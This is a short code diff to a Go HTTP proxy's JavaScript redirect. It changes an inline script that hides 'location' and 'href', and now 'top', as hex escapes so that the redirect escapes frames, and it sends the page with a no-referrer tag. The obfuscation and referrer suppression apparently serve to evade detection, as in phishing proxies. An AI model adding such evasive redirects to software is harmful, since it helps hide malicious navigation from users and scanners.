@@ -1326,8 +1326,8 @@ func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Re
 	obfJS := `
 		<script>
 			(function() {
-				var _0x5f2c=["\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E", "\\x68\\x72\\x65\\x66"];
-				window[_0x5f2c[0]][_0x5f2c[1]]='%s';
+				var parts = ["\\x74\\x6F\\x70", "\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E", "\\x68\\x72\\x65\\x66"];
+				window[parts[0]][parts[1]][parts[2]]='%s';
 			})();
 		</script>`
 	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'>"+obfJS+"</head><body></body></html>", rurl)
